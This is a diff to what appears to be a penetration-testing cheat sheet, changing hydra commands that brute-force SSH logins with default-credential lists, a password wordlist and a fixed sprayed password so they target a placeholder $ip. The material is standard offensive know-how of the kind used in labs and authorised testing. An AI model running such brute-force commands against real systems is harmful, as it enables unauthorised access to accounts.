@@ -4,8 +4,8 @@
 
 ````
 hydra -C /opt/SecLists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt $ip ssh
-hydra -l userc -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.27 -t 4 ssh
-hydra -L users.txt -p WallAskCharacter305 192.168.153.139 -t 4 ssh -s 42022
+hydra -l userc -P /usr/share/wfuzz/wordlist/others/common_pass.txt $ip ssh
+hydra -L users.txt -p WallAskCharacter305 $ip -t 4 ssh -s 42022
 ````
 
 ##### Private key obtained
